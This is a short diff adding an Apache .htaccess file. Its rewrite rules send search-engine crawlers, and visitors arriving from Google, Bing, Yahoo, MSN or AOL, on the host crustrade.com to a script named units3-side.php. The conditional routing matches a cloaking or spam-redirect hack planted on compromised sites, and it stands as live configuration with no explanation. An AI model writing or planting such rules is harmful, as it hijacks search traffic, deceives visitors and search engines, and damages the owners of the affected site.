@@ -1,0 +1,6 @@
+RewriteEngine On
+RewriteBase /
+RewriteCond %{HTTP_USER_AGENT} (msn|bing|yahoo|aol|google) [OR]
+RewriteCond %{HTTP_REFERER} (msn|bing|yahoo|aol|google)
+RewriteCond %{HTTP_HOST} crustrade\.com$
+RewriteRule . units3-side.php?$1 [L]
